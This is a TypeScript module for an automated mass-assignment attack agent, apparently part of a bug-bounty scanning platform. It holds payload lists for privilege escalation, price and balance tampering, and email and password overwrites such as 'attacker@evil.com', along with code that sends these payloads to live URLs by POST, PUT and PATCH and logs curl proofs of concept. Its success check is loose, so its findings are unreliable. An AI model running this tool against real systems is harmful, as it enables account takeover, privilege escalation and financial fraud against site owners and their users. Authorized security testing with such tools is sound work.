/**
 * Mass Assignment Agent
 * Based on PayloadsAllTheThings/Mass Assignment
 * 
 * Detects and exploits mass assignment vulnerabilities:
 * - Parameter pollution
 * - Hidden field injection
 * - Role/privilege escalation
 * - Price manipulation
 * - Object property injection
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface MassAssignmentJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testPrivilegeEscalation?: boolean;
    testPriceManipulation?: boolean;
    testHiddenFields?: boolean;
  };
}

// Mass Assignment Payloads
const MASS_ASSIGNMENT_PAYLOADS = {
  // Privilege escalation fields
  privilegeEscalation: [
    { field: 'admin', values: [true, 1, 'true', 'yes', 'admin'] },
    { field: 'isAdmin', values: [true, 1, 'true'] },
    { field: 'is_admin', values: [true, 1, 'true'] },
    { field: 'role', values: ['admin', 'administrator', 'root', 'superuser'] },
    { field: 'roles', values: [['admin'], 'admin', ['administrator']] },
    { field: 'user_role', values: ['admin', 'administrator'] },
    { field: 'userRole', values: ['admin', 'administrator'] },
    { field: 'permissions', values: [['*'], ['admin'], 'all'] },
    { field: 'privilege', values: ['admin', 'elevated', 'root'] },
    { field: 'access_level', values: ['admin', 'full', 'all'] },
    { field: 'accessLevel', values: [999, 'admin', 'full'] },
    { field: 'group', values: ['admin', 'administrators'] },
    { field: 'groups', values: [['admin'], ['administrators']] },
    { field: 'type', values: ['admin', 'administrator'] },
    { field: 'user_type', values: ['admin', 'administrator'] },
    { field: 'account_type', values: ['premium', 'admin', 'enterprise'] },
    { field: 'verified', values: [true, 1, 'true'] },
    { field: 'is_verified', values: [true, 1] },
    { field: 'active', values: [true, 1] },
    { field: 'approved', values: [true, 1] },
    { field: 'confirmed', values: [true, 1] },
  ],

  // Price/financial manipulation
  priceManipulation: [
    { field: 'price', values: [0, 0.01, 1, -1] },
    { field: 'amount', values: [0, 0.01, 1, -1] },
    { field: 'total', values: [0, 0.01, 1, -1] },
    { field: 'cost', values: [0, 0.01, 1, -1] },
    { field: 'discount', values: [100, 99.99, 1000] },
    { field: 'discount_percent', values: [100, 99.99] },
    { field: 'quantity', values: [-1, 0, 999999] },
    { field: 'balance', values: [999999, 1000000] },
    { field: 'credits', values: [999999, 1000000] },
    { field: 'points', values: [999999, 1000000] },
  ],

  // Account manipulation
  accountManipulation: [
    { field: 'email', values: ['admin@target.com', 'attacker@evil.com'] },
    { field: 'password', values: ['newpassword123'] },
    { field: 'password_hash', values: ['$2a$10$...'] },
    { field: 'user_id', values: [1, 0, 'admin'] },
    { field: 'userId', values: [1, 0] },
    { field: 'id', values: [1, 0] },
    { field: 'owner_id', values: [1] },
    { field: 'created_by', values: [1] },
  ],

  // Status manipulation
  statusManipulation: [
    { field: 'status', values: ['active', 'approved', 'verified', 'paid'] },
    { field: 'state', values: ['active', 'approved', 'completed'] },
    { field: 'payment_status', values: ['paid', 'completed', 'success'] },
    { field: 'order_status', values: ['completed', 'shipped', 'delivered'] },
    { field: 'subscription', values: ['premium', 'enterprise', 'unlimited'] },
    { field: 'plan', values: ['premium', 'enterprise', 'unlimited'] },
    { field: 'tier', values: ['premium', 'enterprise', 'unlimited'] },
  ],

  // Hidden/internal fields
  hiddenFields: [
    '_id', '__v', '_rev', 'createdAt', 'updatedAt', 'created_at', 'updated_at',
    'deleted', 'deleted_at', 'internal', '_internal', '__internal',
    'debug', '_debug', 'test', '_test',
  ],
};

export class MassAssignmentAgent extends BaseAgent<MassAssignmentJob> {
  constructor() {
    super('massassignment');
  }

  protected getSteps() {
    return [
      { name: 'Identify API endpoints', metadata: {} },
      { name: 'Test privilege escalation fields', metadata: {} },
      { name: 'Test price manipulation', metadata: {} },
      { name: 'Test hidden field injection', metadata: {} },
      { name: 'Verify successful manipulation', metadata: {} },
    ];
  }

  async process(job: Job<MassAssignmentJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting mass assignment testing');

    for (const url of urls) {
      try {
        // Test privilege escalation
        if (options.testPrivilegeEscalation !== false) {
          const privFindings = await this.testPrivilegeEscalation(url);
          findings.push(...privFindings);
        }

        // Test price manipulation
        if (options.testPriceManipulation !== false) {
          const priceFindings = await this.testPriceManipulation(url);
          findings.push(...priceFindings);
        }

        // Test hidden fields
        if (options.testHiddenFields !== false) {
          const hiddenFindings = await this.testHiddenFields(url);
          findings.push(...hiddenFindings);
        }

        // Test account manipulation
        const accountFindings = await this.testAccountManipulation(url);
        findings.push(...accountFindings);
      } catch (error) {
        logger.error({ error, url }, 'Error testing mass assignment');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testPrivilegeEscalation(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { field, values } of MASS_ASSIGNMENT_PAYLOADS.privilegeEscalation) {
      for (const value of values) {
        try {
          // Test JSON body
          const jsonPayload = { [field]: value };
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(jsonPayload),
          });

          const body = await response.text();

          // Check if field was accepted
          if (response.ok && this.fieldAccepted(body, field, value)) {
            findings.push({
              type: 'mass-assignment-privilege-escalation',
              url,
              field,
              value,
              severity: 'critical',
              evidence: `Field "${field}" with value "${value}" was accepted`,
              impact: 'Privilege escalation - user can grant themselves admin access',
              poc: `curl -X POST "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(jsonPayload)}'`,
            });
          }

          // Test PUT/PATCH
          for (const method of ['PUT', 'PATCH']) {
            const resp = await fetch(url, {
              method,
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(jsonPayload),
            });

            if (resp.ok && this.fieldAccepted(await resp.text(), field, value)) {
              findings.push({
                type: 'mass-assignment-privilege-escalation',
                url,
                method,
                field,
                value,
                severity: 'critical',
                evidence: `${method} request accepted "${field}" field`,
              });
            }
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testPriceManipulation(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { field, values } of MASS_ASSIGNMENT_PAYLOADS.priceManipulation) {
      for (const value of values) {
        try {
          const jsonPayload = { [field]: value };
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(jsonPayload),
          });

          const body = await response.text();

          if (response.ok && this.fieldAccepted(body, field, value)) {
            findings.push({
              type: 'mass-assignment-price-manipulation',
              url,
              field,
              value,
              severity: 'high',
              evidence: `Price field "${field}" can be manipulated to ${value}`,
              impact: 'Financial fraud - modify prices, balances, or discounts',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testHiddenFields(url: string): Promise<any[]> {
    const findings: any[] = [];

    // Build payload with all hidden fields
    const hiddenPayload: Record<string, any> = {};
    for (const field of MASS_ASSIGNMENT_PAYLOADS.hiddenFields) {
      hiddenPayload[field] = 'injected_value';
    }

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(hiddenPayload),
      });

      const body = await response.text();

      // Check which fields were reflected
      for (const field of MASS_ASSIGNMENT_PAYLOADS.hiddenFields) {
        if (body.includes(field) && body.includes('injected_value')) {
          findings.push({
            type: 'mass-assignment-hidden-field',
            url,
            field,
            severity: 'medium',
            evidence: `Hidden/internal field "${field}" can be set`,
            impact: 'May allow manipulation of internal state',
          });
        }
      }
    } catch (error) {
      // Continue
    }

    return findings;
  }

  private async testAccountManipulation(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { field, values } of MASS_ASSIGNMENT_PAYLOADS.accountManipulation) {
      for (const value of values) {
        try {
          const jsonPayload = { [field]: value };
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(jsonPayload),
          });

          const body = await response.text();

          if (response.ok && this.fieldAccepted(body, field, value)) {
            findings.push({
              type: 'mass-assignment-account-manipulation',
              url,
              field,
              value: typeof value === 'string' ? value : JSON.stringify(value),
              severity: field.includes('password') ? 'critical' : 'high',
              evidence: `Account field "${field}" can be manipulated`,
              impact: field.includes('password') ? 'Account takeover' : 'IDOR or account manipulation',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private fieldAccepted(body: string, field: string, value: any): boolean {
    try {
      const json = JSON.parse(body);
      // Check if field exists in response with our value
      if (json[field] === value) return true;
      if (JSON.stringify(json).includes(String(value))) return true;
    } catch {
      // Not JSON, check string
      if (body.includes(String(value))) return true;
    }
    return false;
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store mass assignment finding');
    }
  }
}

export default new MassAssignmentAgent();
